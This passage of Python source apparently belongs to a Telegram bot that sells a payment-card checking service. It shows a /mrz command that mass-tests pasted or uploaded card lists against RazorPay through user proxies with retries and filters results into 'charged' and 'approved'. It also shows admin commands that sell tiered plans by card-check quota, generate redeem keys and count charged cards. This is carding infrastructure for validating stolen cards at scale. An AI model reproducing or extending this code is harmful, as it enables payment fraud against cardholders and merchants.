        return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: 
        return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): 
                t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)


# ====================== /mrz (RazorPay Mass) - updated with error count ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mrz_mass_check_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at, plan = await get_user_access(event)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MRZ_PROCESSES: 
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: 
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: 
            return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: 
                    content = await f.read()
                os.remove(fp)
            except: 
                pass
        elif rm.text: 
            content = rm.text
    else: 
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mrz</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: 
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: 
        cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    if from_inline:
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}


@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    try: 
        await data["pref_msg"].delete()
    except: 
        pass
    if uid in ACTIVE_MRZ_PROCESSES: 
        return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))


@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(puid)
    if not proc: 
        return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): 
                t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)


# ====================== /status (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: 
        return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception as e: 
        await styled_reply(event, f"⚠️ <code>{e}</code>")


@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: 
        return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except: 
        pass


# ====================== ADMIN COMMANDS (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: 
        return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])


async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: 
        return
    parts = event.raw_text.split()
    if len(parts) < 2: 
        return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: 
        target_uid = int(parts[1])
    except: 
        return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: 
        target_entity = await client_instance.get_entity(target_uid)
        target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except: 
        target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid)
    is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>\n<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>\n<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    try:
        await styled_send(target_uid, f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\n{bs('Limit')}: {pi['cc_limit']} CCs\n{bs('Expires')}: {expiry_date}""")
    except: 
        pass
    try:
        receipt_id = f"CARDX-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        lt = f"{bs('Plan RENEWED')} 🔄" if is_upgrade else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID, f"<b>{lt}</b>\n<a href='tg://user?id={target_uid}'>{target_name}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {receipt_id}")
    except: 
        pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]trial\b'))
async def trial_cmd(event): 
    await _handle_plan_assign(event, "trial")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): 
    await _handle_plan_assign(event, "plan1")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): 
    await _handle_plan_assign(event, "plan2")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): 
    await _handle_plan_assign(event, "plan3")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): 
    await _handle_plan_assign(event, "plan4")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: 
        return
    parts = event.raw_text.split()
    if len(parts) < 2: 
        return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: 
        target_uid = int(parts[1])
    except: 
        return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp): 
        return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try: 
        ent = await client_instance.get_entity(target_uid)
        tn = getattr(ent, 'first_name', None) or "?"
    except: 
        tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: 
        await styled_send(target_uid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>", emoji_ids=[CE["warn"]])
    except: 
        pass


# ====================== ADMIN CODE COMMANDS (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]gencode(?:\s+(.+))?'))
async def generate_code_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    args = event.pattern_match.group(1)
    if not args:
        return await styled_reply(event, f"""⚡ <b>{bs('GENERATE CODE')}</b> ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚡ <code>/gencode trial</code> - {bs('Trial (2d, 500 CCs)')}
┣ ⚡ <code>/gencode plan1</code> - {bs('Core (7d, 1500 CCs)')}
┣ ⚡ <code>/gencode plan2</code> - {bs('Elite (15d, 2500 CCs)')}
┣ ⚡ <code>/gencode plan3</code> - {bs('Root (30d, 5000 CCs)')}
┣ ⚡ <code>/gencode plan4</code> - {bs('X (90d, 10000 CCs)')}
┣ ⚡ <code>/gencode trial 5</code> - {bs('Generate 5 trial codes')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚡ <code>/codes</code> - {bs('View all codes')}
┣ ⚡ <code>/delcode CODE</code> - {bs('Delete a code')}
┗ ⚡ <code>/codeinfo CODE</code> - {bs('Code details')}""", emoji_ids=[CE["fire"], CE["gift"], CE["info"]])
    
    parts = args.split()
    plan_key = parts[0].lower()
    count = int(parts[1]) if len(parts) > 1 else 1
    
    if plan_key not in PLANS:
        return await styled_reply(event, f"❌ <b>{bs('Invalid plan')}</b>\n{bs('Options:')} trial, plan1, plan2, plan3, plan4", emoji_ids=[CE["cross"]])
    
    if count > 50:
        count = 50
        await styled_reply(event, f"⚠️ <b>{bs('Limited to 50 codes max')}</b>", emoji_ids=[CE["warn"]])
    
    codes = await generate_plan_code(plan_key, count)
    plan_info = PLANS[plan_key]
    
    codes_text = ""
    for i, code in enumerate(codes, 1):
        if i == len(codes):
            codes_text += f"┗ ⚡ <code>{code}</code>\n"
        else:
            codes_text += f"┣ ⚡ <code>{code}</code>\n"
    
    await styled_reply(event, f"""⚡ <b>{bs('KEYS GENERATED')}</b> ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┣ ⚡ <b>{bs('Count')}</b> ➜ {count}
┣ ⚡ <b>{bs('Plan')}</b> ➜ {plan_info['emoji']} {plan_info['name']} ({plan_info['duration_days']}d | {plan_info['cc_limit']} CCs)
┣ ⚡ <b>{bs('Keys')}</b>

{codes_text}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>{bs('Users redeem with')}</b> <code>/redeem [key]</code>""", emoji_ids=[CE["gift"], CE["crown"], CE["info"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]codes$'))
async def list_codes_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    codes = await get_all_active_codes()
    
    if not codes:
        return await styled_reply(event, f"⚡ <b>{bs('No active codes')}</b>", emoji_ids=[CE["info"]])
    
    text = f"⚡ <b>{bs('ACTIVE CODES')}</b> ({len(codes)}) ⚡\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    for code, info in list(codes.items())[:50]:
        plan_key = info.get("plan", "unknown")
        plan_info = PLANS.get(plan_key, {"emoji": "❓", "name": plan_key})
        created = info.get("created_at", "")[:10]
        text += f"┣ {plan_info['emoji']} <code>{code}</code> ━ {bs('Created')}: {created}\n"
    
    await styled_reply(event, text, emoji_ids=[CE["fire"], CE["fire"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]codeinfo\s+([A-Z0-9_]+)$'))
async def code_info_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    code = event.pattern_match.group(1).upper()
    code_info = get_code_info(code)
    
    if not code_info:
        return await styled_reply(event, f"❌ <b>{bs('Code not found')}</b>", emoji_ids=[CE["cross"]])
    
    plan_key = code_info.get("plan")
    plan_info = PLANS.get(plan_key, {"emoji": "❓", "name": plan_key, "duration_days": 0, "cc_limit": 0})
    used = code_info.get("used", False)
    used_by = code_info.get("used_by")
    used_at = code_info.get("used_at")
    created_at = code_info.get("created_at", "")[:19]
    
    status = "❌ Used" if used else "✅ Available"
    used_by_text = f"<a href='tg://user?id={used_by}'>{used_by}</a>" if used_by else "None"
    used_at_text = used_at[:19] if used_at else "Never"
    
    await styled_reply(event, f"""⚡ <b>{bs('CODE INFO')}</b> ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_info['emoji']} <b>{code}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚡ {bs('Plan')}: {plan_info['name']}
┣ ⚡ {bs('Duration')}: {plan_info['duration_days']} days
┣ ⚡ {bs('CC Limit')}: {plan_info['cc_limit']}
┣ ⚡ {bs('Status')}: {status}
┣ ⚡ {bs('Created')}: <code>{created_at}</code>
┣ ⚡ {bs('Used By')}: {used_by_text}
┗ ⚡ {bs('Used At')}: <code>{used_at_text}</code>""", emoji_ids=[CE["gift"], CE["info"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]delcode\s+([A-Z0-9_]+)$'))
async def delete_code_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    code = event.pattern_match.group(1).upper()
    
    if not is_valid_code(code):
        return await styled_reply(event, f"❌ <b>{bs('Code not found or already used')}</b>", emoji_ids=[CE["cross"]])
    
    code_info = get_code_info(code)
    await remove_code(code)
    
    plan_key = code_info.get("plan", "unknown")
    plan_info = PLANS.get(plan_key, {"emoji": "❓", "name": plan_key})
    
    await styled_reply(event, f"✅ <b>{bs('Code Deleted')}</b>\n{plan_info['emoji']} <code>{code}</code>", emoji_ids=[CE["check"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: 
        return
    all_users = []
    for tier in PAID_TIERS:
        async for u in db["users"].find({"plan": tier}): 
            all_users.append(u)
    if not all_users: 
        return await styled_reply(event, f"{PE} <b>{bs('No active plans')}</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ACTIVE PLANS ({len(all_users)})\n{'='*40}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?")
        tier = u.get("plan", "?")
        exp = u.get("expiry")
        es = exp.strftime('%Y-%m-%d') if exp else "?"
        try: 
            ent = await client_instance.get_entity(uid2)
            un = getattr(ent, 'first_name', None) or "?"
        except: 
            un = "?"
        content += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: 
        await f.write(content)
    try: 
        await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(all_users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except: 
        pass
    try: 
        os.remove(fn)
    except: 
        pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: 
        return
    try:
        tu = await get_total_users()
        pu = await get_premium_count()
        ts2 = await get_total_sites_count()
        tc = await get_total_cards_count()
        ch = await get_charged_count()
        ap = await get_approved_count()
        codes = await get_all_active_codes()
        codes_count = len(codes)
        all_codes = await get_all_codes()
        total_codes = len(all_codes)
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts2}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Codes')}:</b> <code>{codes_count}/{total_codes}</code> ({bs('Active/Total')})
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
